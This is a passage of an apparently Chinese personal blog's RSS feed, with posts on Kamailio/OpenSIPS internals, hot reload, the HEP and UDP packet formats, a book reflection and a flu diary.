&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;36&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ksr_msg_env_reset&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;37&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/* reset log prefix */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;38&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;log_prefix_set&lt;/span&gt;(NULL);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;39&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;40&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回-1，表示出错
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;41&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;42&lt;/span&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;如果调用receive_msg返回负数，那么从调用栈向上查找receive_tcp_msg函数也会返回负数
&lt;ul&gt;
&lt;li&gt;int receive_tcp_msg(char *tcpbuf, unsigned int len,struct receive_info *rcv_info, struct tcp_connection *con)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;receive_tcp_msg函数返回负数，那么向上查找，tcp_read_req也会返回负数
&lt;ul&gt;
&lt;li&gt;int tcp_read_req(struct tcp_connection *con, int *bytes_read,rd_conn_flags_t *read_flags)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tcp_read_req返回负数
&lt;ul&gt;
&lt;li&gt;inline static int handle_io(struct fd_map *fm, short events, int idx)在这个函数内部&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;unlikely&lt;/span&gt;(bytes &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;LOG&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cfg_get&lt;/span&gt;(core, core_cfg, corelog),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ERROR: tcp_read_req: error reading - c: %p r: %p (%d)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					con, req, bytes);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			resp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CONN_ERROR;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; end_req;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        resp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tcp_read_req&lt;/span&gt;(con, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;n, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;read_flags);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;unlikely&lt;/span&gt;(resp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;/* some error occurred, but on the new fd, not on the tcp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;				 * main fd, so keep the ret value */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;unlikely&lt;/span&gt;(resp &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; CONN_EOF))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					con&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S_CONN_BAD;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#a6e22e&#34;&gt;release_tcpconn&lt;/span&gt;(con, resp, tcpmain_sock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;整个调用链条是这样的：
handle_io -&amp;gt; tcp_read_req -&amp;gt; receive_tcp_msg -&amp;gt; receive_msg&lt;/p&gt;</description>
    </item>
    <item>
      <title>Hot Reload OpenSIPS vs Kamailio</title>
      <link>https://wdd.js.org/posts/2025/hot-reload-opensips-vs-kamailio/</link>
      <pubDate>Sat, 29 Mar 2025 13:49:38 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/hot-reload-opensips-vs-kamailio/</guid>
      <description>&lt;p&gt;用过nginx的都知道，改了nginx的配置文件，只需要执行&lt;code&gt;nginx -s reload&lt;/code&gt;就可以让改动生效，而不用重启整个服务。&lt;/p&gt;
&lt;p&gt;在kamailio和opensips中，也有类似的热重载功能。&lt;/p&gt;
&lt;p&gt;在kamailio中，如果要热重载配置文件，只需要执行&lt;code&gt;kamcmd app_jsdt.reload&lt;/code&gt;即可。
在opensips中，如果要热重载配置文件，只需要执行&lt;code&gt;opensips-cli -x mi reload_routes&lt;/code&gt;即可。&lt;/p&gt;
&lt;p&gt;理想很丰满，现实很骨感。&lt;/p&gt;
&lt;p&gt;如果要只是修改路由模块，两者都可以做热重载。 如果要动态的新增一些模块，那就必须要重启。&lt;/p&gt;
&lt;h1 id=&#34;kamailio的实现方案&#34;&gt;Kamailio的实现方案&lt;/h1&gt;
&lt;p&gt;必须要用KEMI框架： cfg + [lua|js|python|ruby]&lt;/p&gt;
&lt;p&gt;用这个框架，你写的路由脚本将包括两个部分&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;核心模块，全局配置，模块加载，模块配置，事件路由这部分内容还是写在cfg文件中。&lt;/li&gt;
&lt;li&gt;请求路由、响应路由、分支路由、失败路由等这部分内容可以用lua、js、 python等来写。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在热重载的时候，实际上只有外部脚本会被重新加载，而核心模块是不会被重新加载的。&lt;/p&gt;
&lt;p&gt;因为部分路由用其他脚本编写，必然涉及到性能比较。官方给出的结论是，在同等条件下，lua的性能是最好的。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.kamailio.org/wikidocs/devel/config-engines/#interpreters-performances&#34;&gt;https://www.kamailio.org/wikidocs/devel/config-engines/#interpreters-performances&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是实际生产环境如何，还不好说。&lt;/p&gt;
&lt;p&gt;另外一点，就是并不是所有模块都实现了KEMI框架的接口，可能存在风险。&lt;/p&gt;
&lt;h1 id=&#34;opensips的实现方案&#34;&gt;OpenSIPS的实现方案&lt;/h1&gt;
&lt;p&gt;OpenSIPS在3.0版本首次引入了热重载路由脚本的能力，脚本还是cfg，没有引入其他语言。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.opensips.org/Documentation/Interface-CoreMI-3-0#toc8&#34;&gt;https://www.opensips.org/Documentation/Interface-CoreMI-3-0#toc8&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;结论&#34;&gt;结论&lt;/h1&gt;
&lt;p&gt;总体而言，目的是相同的，都是为了热重载路由。&lt;/p&gt;
&lt;p&gt;kamailio的方案看似灵活，实则复杂。如果cfg本身就能做热重载，那么就没必要引入其他语言。&lt;/p&gt;
&lt;p&gt;我更倾向使用OpenSIPS的方案&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.opensips.org/2019/04/04/no-downtime-for-opensips-3-0-restarts/&#34;&gt;https://blog.opensips.org/2019/04/04/no-downtime-for-opensips-3-0-restarts/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>开发学习笔记</title>
      <link>https://wdd.js.org/kamailio/devel-guide-note/</link>
      <pubDate>Fri, 21 Feb 2025 22:17:35 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/devel-guide-note/</guid>
      <description>&lt;h1 id=&#34;架构图&#34;&gt;架构图&lt;/h1&gt;
&lt;p&gt;kamailio 1.x版本
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/devel-guide-note/atta/2025-02-21-22-18-34.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;kamailio 3.x版本。相比于1.x版本，两个核心模块移动到外部模块。
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/devel-guide-note/atta/2025-02-21-22-19-54.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;核心模块
The core includes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;memory manager&lt;/li&gt;
&lt;li&gt;SIP message parser&lt;/li&gt;
&lt;li&gt;locking system&lt;/li&gt;
&lt;li&gt;DNS and transport layer management (UDP, TCP, TLS, SCTP)&lt;/li&gt;
&lt;li&gt;configuration file parser and interpreter&lt;/li&gt;
&lt;li&gt;stateless forwarding&lt;/li&gt;
&lt;li&gt;pseudo-variables and transformations engines&lt;/li&gt;
&lt;li&gt;RPC control interface API&lt;/li&gt;
&lt;li&gt;timer API&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The internal libraries include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;some components from old Kamailio v1.5.x core&lt;/li&gt;
&lt;li&gt;database abstraction layers (DB API v1 and v2)&lt;/li&gt;
&lt;li&gt;management interface (MI) API&lt;/li&gt;
&lt;li&gt;statistics engine&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sip消息处理&#34;&gt;SIP消息处理&lt;/h1&gt;
&lt;p&gt;请求处理
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/devel-guide-note/atta/2025-02-21-22-23-52.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;响应处理。 这里可以看到，是先执行响应路由，再执行失败路由。
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/devel-guide-note/atta/2025-02-21-22-24-59.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>kamailio 集成 HEP Server</title>
      <link>https://wdd.js.org/kamailio/homer-hep/</link>
      <pubDate>Mon, 17 Feb 2025 22:57:11 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/homer-hep/</guid>
      <description>&lt;h1 id=&#34;目标&#34;&gt;目标&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;kamailio将所收到的SIP消息封装成HEP格式，然后已UDP发送给Hep Server&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;环境说明&#34;&gt;环境说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;kamailio版本 5.6&lt;/li&gt;
&lt;li&gt;Hep server地址 192.168.0.100&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;kamailio脚本&#34;&gt;kamailio脚本&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cfg&#34; data-lang=&#34;cfg&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考文档&#34;&gt;参考文档&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/docs/modules/5.6.x/modules/siptrace.html&#34;&gt;https://www.kamailio.org/docs/modules/5.6.x/modules/siptrace.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sipcapture/homer/discussions/619&#34;&gt;https://github.com/sipcapture/homer/discussions/619&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sipcapture/homer/wiki/Examples%3A-Kamailio&#34;&gt;https://github.com/sipcapture/homer/wiki/Examples%3A-Kamailio&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>HEP 协议学习笔记</title>
      <link>https://wdd.js.org/posts/2025/hep-protocol/</link>
      <pubDate>Sun, 02 Feb 2025 15:12:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/hep-protocol/</guid>
      <description>&lt;h1 id=&#34;hep简介&#34;&gt;HEP简介&lt;/h1&gt;
&lt;p&gt;HEP协议目前叫做EEP(Extensible Encapsulation Protocol), 那之前的缩写HEP的H，我只能推测为homer。&lt;/p&gt;
&lt;p&gt;这个协议的主要功能是对VoIP连路上的数据包，例如SIP进行封装，方便后续分析SIP信令图。&lt;/p&gt;
&lt;p&gt;目前这个协议已经升级到V3版本，在这个pdf&lt;a href=&#34;https://github.com/sipcapture/HEP/blob/master/docs/HEP3_Network_Protocol_Specification_REV_36.pdf&#34;&gt;HEP3_Network_Protocol_Specification_REV_36&lt;/a&gt;中有详细的介绍。&lt;/p&gt;
&lt;p&gt;今天我们主要看这个协议的V3版本的协议是如何实现的。&lt;/p&gt;
&lt;h1 id=&#34;包头&#34;&gt;包头&lt;/h1&gt;
&lt;pre class=&#34;mermaid&#34;&gt;packet-beta
title HEP Packet
0-3: &amp;#34;版本号&amp;#34;
4-5: &amp;#34;总长度&amp;#34;
6-15: &amp;#34;数据段(变长)&amp;#34;
&lt;/pre&gt;
&lt;p&gt;HEPv3的包头是6个字节，主要分为三个部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;版本号：固定4个字节长度，是HEP3&lt;/li&gt;
&lt;li&gt;总长度：固定2个字节长度，是包的总长度，这个总长度包括了包头的六个字节。所以HEP包的大小范围一般是6-65535之间。&lt;/li&gt;
&lt;li&gt;数据段：数据段的长度不固定&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注意事项：假如从传输层读到1000个字节的数据，在解析前6个字节是，发现总长度(total length)的子段是1200，那就说明本次读到的数据还不是一个完整的&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;数据段解析&#34;&gt;数据段解析&lt;/h1&gt;
&lt;p&gt;数据段由固定6字节长度的头部和变长的payload部分。&lt;/p&gt;
&lt;pre class=&#34;mermaid&#34;&gt;packet-beta
title HEP Packet
0-1: &amp;#34;vendor ID&amp;#34;
2-3: &amp;#34;type ID&amp;#34;
4-5: &amp;#34;length&amp;#34;
6-15: &amp;#34;payload&amp;#34;
&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;vendor ID: 固定2字节长度, 其实意义不大，&lt;/li&gt;
&lt;li&gt;type ID: 固定2字节长度，这个子段很重要，决定了payload的类型。可以理解为是一个对象的key, 然后把payload理解为value&lt;/li&gt;
&lt;li&gt;length: 固定2字节长度，范围是0-65535，这个字段是也是整个数据段的长度，也就是包括了6个字节的段头&lt;/li&gt;
&lt;li&gt;payload: 长度是length的长度-6，表示数据长度&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;hep协议有个type ID的映射表&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;chunk type ID&lt;/th&gt;
          &lt;th&gt;类型&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0x0001&lt;/td&gt;
          &lt;td&gt;uint8&lt;/td&gt;
          &lt;td&gt;IP类型，0x02=IPv4, 0x0a=IPv6&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0x0002&lt;/td&gt;
          &lt;td&gt;uint8&lt;/td&gt;
          &lt;td&gt;协议类型 0x06=TCP, 0x11=UDP， 可以参考&lt;a href=&#34;https://zh.wikipedia.org/wiki/IP%E5%8D%8F%E8%AE%AE%E5%8F%B7%E5%88%97%E8%A1%A8&#34;&gt;IP协议号列表&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;其他的字段还有很多，可以参考&lt;a href=&#34;https://github.com/sipcapture/HEP/blob/master/docs/HEP3_Network_Protocol_Specification_REV_36.pdf&#34;&gt;HEP3_Network_Protocol_Specification_REV_36&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>写日记的正经人 - 季羡林</title>
      <link>https://wdd.js.org/posts/2025/jixianlin-book/</link>
      <pubDate>Tue, 21 Jan 2025 21:57:06 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/jixianlin-book/</guid>
      <description>&lt;p&gt;在电影《邪不压正》中，关于写日记的经典对白是&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;正经人谁写日记啊？&amp;#34;
&amp;#34;是啊&amp;#34;
&amp;#34;你写日记吗？&amp;#34;
&amp;#34;我不写。你写日记吗？&amp;#34;
&amp;#34;谁能把心里话写日记里？&amp;#34;
&amp;#34;写出来的那能叫心里话？&amp;#34;
&amp;#34;下贱！&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;给我灌输一种感觉写日记的人往往是虚伪的。&lt;/p&gt;
&lt;p&gt;然而，最近我看了季羡林先生两本书《牛棚杂忆》和《留得十年》，我不得不对季先生佩服的五体投地，眼角朦胧，鼻头发酸。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我在德国十年的日记，一天不缺，恐怕有一两百万字。&amp;ndash;《留德十年》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;做一件小事，坚持10年。 这是什么样动机，是因为毅力吗？&lt;/p&gt;
&lt;p&gt;如果说做一件事让自己感觉很难，不想做，但是做了很长时间，可以称之为毅力。&lt;/p&gt;
&lt;p&gt;我觉得除了毅力，更多的一种喜欢，一种习惯。一种把思想自然流露指尖，落笔成文的自然天性。&lt;/p&gt;
&lt;p&gt;我不记得以前上学时，有没有度过季先生的。然而季先生的大名，还是略有耳闻的。&lt;/p&gt;
&lt;p&gt;但是除了季先生的大名的，其他的事情，几乎不了解。&lt;/p&gt;
&lt;p&gt;看了两本书书后，我不禁对季先生生有有一种心驰神往。&lt;/p&gt;
&lt;p&gt;我不知道季先生原来是清朝末年的人。经历过清末、民国、二战、解放、文化大革命&amp;hellip;&lt;/p&gt;
&lt;p&gt;我不知道季先生原来去德国留过学，而且是是坐火车去的。 德国哥廷根的风景描写，让我脑海里呈现一种宫崎骏动画般画面。&lt;/p&gt;
&lt;p&gt;我不知道原来季先生在德国还经历过二战。&lt;/p&gt;
&lt;p&gt;我不知道季先生原来还在文化大革命中，数次被打倒。&lt;/p&gt;
&lt;p&gt;季先生的文风朴实，感情自然流露。你能从他的文字中看到一个普通人懦弱与勇气、迷茫与坚持、欲望和克制。&lt;/p&gt;
&lt;p&gt;我喜欢季先生的文风，也喜欢季先生的为人。&lt;/p&gt;
&lt;p&gt;我觉得，归根结底，我喜欢真实，厌恶粉饰。&lt;/p&gt;</description>
    </item>
    <item>
      <title>RFC768 UDP包学习笔记</title>
      <link>https://wdd.js.org/network/rfc768-udp/</link>
      <pubDate>Wed, 01 Jan 2025 20:23:41 +0800</pubDate>
      <guid>https://wdd.js.org/network/rfc768-udp/</guid>
      <description>&lt;h1 id=&#34;包格式&#34;&gt;包格式&lt;/h1&gt;
&lt;p&gt;UDP包头工占用8个字节,  其中源端口和目标端口各占2个字节，长度占2个字节，校验和占2个字节。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    0      7 8     15 16    23 24    31
   +--------+--------+--------+--------+
   |     Source      |   Destination   |
   |      Port       |      Port       |
   +--------+--------+--------+--------+
   |                 |                 |
   |     Length      |    Checksum     |
   +--------+--------+--------+--------+
   |
   |          data octets ...
   +---------------- ...

        User Datagram Header Format
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;字段&#34;&gt;字段&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;源端口&lt;/strong&gt;，可选字段，默认为0，如果是有意义的其他端口，表示后续响应可以送回到该端口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目标端口&lt;/strong&gt;，必须字段，用来关联目标主机上进程监听的端口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;长度&lt;/strong&gt;，长度是整个UDP包的长度，也就是包头 + 包的数据，包头固定8字节，那么length的最小长度就是8&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;校验和&lt;/strong&gt;，用来验证传输过程中是否发生了错误。校验和的计算结果与源IP、目标IP、UDP的包长有关。 如果校验和失败，那么消息会被丢弃。 有些校验和计算的工作会被放置在网卡上，从而减少CPU的负载。当然如果在网卡上因为校验和的问题被网卡丢弃，上层应用是收不到不到UDP包的。但是用tcpdump可以抓到这种校验和有问题的包。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;思考1： 为什么源端口可以设置为0？&lt;/p&gt;
&lt;p&gt;答：有些UDP包，是不需要响应的，只需要发送出消息。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc768&#34;&gt;https://datatracker.ietf.org/doc/html/rfc768&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wdd.js.org/opensips/ch7/big-udp-msg/&#34;&gt;https://wdd.js.org/opensips/ch7/big-udp-msg/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wdd.js.org/network/udp-checksum-offload/&#34;&gt;https://wdd.js.org/network/udp-checksum-offload/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>2024年的最后三天 - 甲流来袭</title>
      <link>https://wdd.js.org/posts/2024/the-edn-day/</link>
      <pubDate>Tue, 31 Dec 2024 21:06:09 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2024/the-edn-day/</guid>
      <description>&lt;h1 id=&#34;28号---抗体&#34;&gt;28号 - 抗体&lt;/h1&gt;
&lt;p&gt;28号晚上，我觉得嗓子有点刺痛。因为前两周发过一次烧，我觉得这次嗓子痛应该不会是发烧的前奏了，毕竟身体是有抗体的。&lt;/p&gt;
&lt;p&gt;我高估了之前产生的抗体。&lt;/p&gt;
&lt;h1 id=&#34;29号---梦&#34;&gt;29号 - 梦&lt;/h1&gt;
&lt;p&gt;从29号上午开始，身体就好像在温水煮青蛙，最高到达惊人的峰值40度。&lt;/p&gt;
&lt;p&gt;为了控制体温，我先洗个热水澡，吃了布洛芬，躺在床上，拿了一块冰袋，裹在卫生纸里，搁在脑门上。身体挺直，裹着两层厚被。&lt;/p&gt;
&lt;p&gt;长夜慢慢，睡睡醒醒。&lt;/p&gt;
&lt;p&gt;我梦见自己变成了一棵树，脚上好像长出了根须，缓慢的往地下生长。穿过泥土，与蚯蚓擦肩而过。穿过岩石，被石油染黑。然而到达的却是一块冰山，冰冷坚硬。&lt;/p&gt;
&lt;p&gt;手上长出了树干，像天空伸展，摊开自己的枝叶，还没等我享受片刻温暖，太阳仿佛飞速向我飞来，炙热的阳光让我瞬间枯黄，灰飞烟灭。&lt;/p&gt;
&lt;p&gt;长夜慢慢，我不敢辗转反侧。我头上还顶着一块冰。&lt;/p&gt;
&lt;h1 id=&#34;30号---发热门诊&#34;&gt;30号 - 发热门诊&lt;/h1&gt;
&lt;p&gt;终于熬到早上，再测试一遍体温，38度。&lt;/p&gt;
&lt;p&gt;算了，还是去医院吧。&lt;/p&gt;
&lt;p&gt;穿戴整齐，刚下楼，迎面吹来一阵冷风。我有种无法压抑的，想要咳嗽的冲动，但是我必须忍住，我知道这咳嗽必然“感天动地&amp;quot;。&lt;/p&gt;
&lt;p&gt;风继续吹，我忍不住咳了出来，那感觉，仿佛有人伸手把我的气管从我的嘴巴里扯了出来。&lt;/p&gt;
&lt;p&gt;到了医院，发热门诊是单独一层的小房子，和气派的十几层的门诊大楼相比，简直像个保安室。&lt;/p&gt;
&lt;p&gt;发热门诊虽小，但也五脏俱全。&lt;/p&gt;
&lt;p&gt;进门先做鼻拭子，量体温，挂号。 再做血液分析，然后就排队等叫号。医生看了报告，说我是甲流，开了两盒药，一盒抗病毒，一盒用来退烧。&lt;/p&gt;
&lt;p&gt;从医院出来，已经中午。我走进医院旁边的永X大王，准备随便吃点。&lt;/p&gt;
&lt;p&gt;我挑了一个座位，扫码下单，点了馄炖、蒸蛋、豆浆、银耳莲子羹。&lt;/p&gt;
&lt;p&gt;等餐期间， 我发现对面有个中年人大叔，穿这黑色的宽大的羽绒服，胡子拉碴、头发稀少， 他时不时的巡视着其他的人。&lt;/p&gt;
&lt;p&gt;没过过久，我等到自己的餐。&lt;/p&gt;
&lt;p&gt;馄炖上撒了淡黄的鸡蛋丝和黑色海苔碎，鸡蛋丝吃起来像绳子，海苔碎味同嚼蜡。混度汤非常浑浊，像是用了一天的澡堂池子水。馄炖我就吃了一个，就放弃了。&lt;/p&gt;
&lt;p&gt;蒸蛋应该是预制菜，放在黑色塑料小杯中，应该是微波炉加热的。我吃了一口，味道奇怪。&lt;/p&gt;
&lt;p&gt;豆浆没什么好说的，毕竟也味道也没有下降空间了。&lt;/p&gt;
